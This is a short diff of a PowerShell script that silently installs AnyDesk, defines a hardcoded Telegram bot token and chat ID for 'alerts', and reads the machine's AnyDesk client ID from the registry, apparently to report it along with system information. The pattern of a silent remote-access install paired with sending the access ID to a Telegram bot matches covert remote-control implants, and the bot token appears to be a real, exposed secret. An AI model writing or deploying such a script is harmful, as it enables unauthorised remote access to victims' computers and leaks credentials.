@@ -1,14 +1,12 @@
-# Install AnyDesk (Silent Mode)
+# Install Only AnyDesk (Silent Mode)
 choco install anydesk -y
-
-# Install Firefox
-choco install firefox -y
 
 # Telegram Alert Setup
 $BOT_TOKEN = "8469309529:AAH1kdLYjtwee39EAgULMJa64Db_xRnWpYw"
 $CHAT_ID = "1361241039"
 
 # Get AnyDesk ID
+Start-Sleep -Seconds 10
 $anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id
 
 # System Info
